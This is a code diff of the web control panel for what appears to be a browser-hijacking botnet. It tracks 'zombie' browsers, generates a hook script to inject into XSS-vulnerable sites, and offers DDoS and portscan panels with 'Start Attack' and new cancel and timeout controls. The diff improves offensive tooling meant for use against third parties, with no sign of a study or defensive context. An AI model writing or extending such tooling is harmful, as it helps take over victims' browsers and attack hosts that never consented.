@@ -11,8 +11,8 @@
 
 	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.js"></script>
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-	<script type="text/javascript" src="{{STATIC_URL}}/js/bootbox.min.js"></script>
-	<script type="text/javascript" src="{{STATIC_URL}}/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="{{STATIC_URL}}js/bootbox.min.js"></script>
+	<script type="text/javascript" src="{{STATIC_URL}}js/bootstrap.min.js"></script>
 
 <script>
 
@@ -68,19 +68,28 @@ $(function(){
 	});
 });
 
-
+var zombies = {};
 function msghandler(json){
 
 	json = JSON.parse(json);
-
-	if(json.hasOwnProperty('newzombieId') == true){
-
-		$("table[name='zombies']").append(	"<tr class='active'><td id="+json['newzombieId']+">"+json['newzombieHost']+"<span class ='glyphicon glyphicon-flash'></span></td></tr>");
+	///new or reconnected zombie
+	if(json.hasOwnProperty('new') == true){
+		if(zombies.hasOwnProperty(json['newzombieId'])==false){
+			zombies[json['newzombieId']]=json['newzombieId'];
+			$("table[name='zombies']").append(	"<tr class='active'><td id="+json['newzombieId']+">"+json['newzombieHost']+"<span class ='glyphicon glyphicon-flash'></span></td></tr>");
+		}
+		else{
+			//mark as active
+		}
 	}
-
-	if(json.hasOwnProperty("host")==true){
+	//update from portscan
+	else if(json.hasOwnProperty("host")==true){
 
 			$("tbody[name='hosts']").append(	"<tr class='active'><td><span class ='glyphicon glyphicon-flash'>"+json['host']+"</span></td></tr>");
+	}
+	//zombie lost connection
+	else if(json.hasOwnProperty("dead")==true){
+		//mark zombie as dead
 	}
 
 }
@@ -135,14 +144,15 @@ function createHook(){
 			url: "{%url 'control-hookcreate'%}",
 			type: 'POST',
 			dataType: "json",
-			data:{'server_ip':ipserver},
+			data:{},
 			success: function(json){
 
 				var scpt = '"'+String(json['resp'])+'"';
-				bootbox.alert("Inject script with "+ scpt+ " to XSS vulnerable target.\n Script is located in current working directory.");
+				bootbox.alert("Inject "+ scpt+ " to XSS vulnerable target.\n");
 			}
 	});
 }
+$(function(){createHook();})
 $(function(){$(".ddos").hide();})
 $(function(){$(".portscan").hide();})
 $(function(){$(".hosts").hide();})
@@ -151,7 +161,6 @@ function drop(input){
 	$("."+input).toggle();
 
 	if(input.match("portscan")){
-
 		$(".hosts").toggle();
 	}
 
@@ -189,16 +198,7 @@ function drop(input){
 
 	<div class="col-md-4 col-md-offset-15">
 
-		<div class="create-injection">
-			<div class="form-inline" >
-				<div class="form-group">
-					{% csrf_token %}
 
-					<input type="text" class="form-control" id="server_ip" placeholder="server ip">
-				</div>
-					<button onclick="createHook();" class="btn btn-default">Create Hook</button>
-				</div>
-		</div>
 
 		<div class="attacks" >
 
@@ -243,10 +243,13 @@ function drop(input){
 		<div class="portscan">
 			<div class="form-inline">
 				<div class="form-group">
-					<label for="network">Network Target</label>
+					<label for="network">Scan Zombie</label>
 					<input type="text" clas="form-control" id="network" placeholder="target zombie">
+					<label for="timeout">Timeout</label>
+					<input type="text" class="form-control" id="timeout" placeholder="timeout">
 				</div>
 				<button onclick="portscan();" class="btn btn-default">Start Attack</button>
+				<button onclick="cancel();" class="btn btn-default">Cancel</button>
 			</div>
 		</div>
 
